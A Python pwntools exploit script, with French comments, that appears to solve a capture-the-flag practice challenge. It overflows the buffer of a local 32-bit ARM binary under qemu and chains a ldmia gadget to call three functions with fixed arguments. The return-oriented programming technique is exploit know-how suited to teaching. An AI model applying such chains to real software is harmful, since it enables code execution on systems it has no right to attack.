#!/usr/bin/env python3
from pwn import *
 
context.arch   = 'arm'
context.bits   = 32
context.endian = 'little'
# context.log_level = 'debug'
 
BINARY = './callme_armv5-hf'
 
OFFSET = 36
GADGET = 0x00010870          # ldmia sp!, {r0, r1, r2, lr, pc}  (ARM)
CALLME_ONE   = 0x00010624
CALLME_TWO   = 0x00010678
CALLME_THREE = 0x00010618
ARG1, ARG2, ARG3 = 0xdeadbeef, 0xcafebabe, 0xd00df00d
 
 
def block(fn_plt):
    """5 mots consommes par UN ldmia : r0,r1,r2,lr(=gadget),pc(=fn)."""
    return (p32(ARG1) + p32(ARG2) + p32(ARG3)
            + p32(GADGET)      # lr -> la fonction revient AU gadget
            + p32(fn_plt))     # pc -> callme_X(r0,r1,r2)
 
 
payload  = b'A' * OFFSET
payload += p32(GADGET)         # saut initial (depuis le pc sauve ecrase)
payload += block(CALLME_ONE)   # 1er ldmia  -> callme_one
payload += block(CALLME_TWO)   # retour gadget -> callme_two
payload += block(CALLME_THREE) # retour gadget -> callme_three
 
p = process(['qemu-arm', '-L', '/usr/arm-linux-gnueabihf/',
             '-E', 'LD_LIBRARY_PATH=.', BINARY])
p.send(payload)
print(p.recvall(timeout=3).decode(errors='replace'))

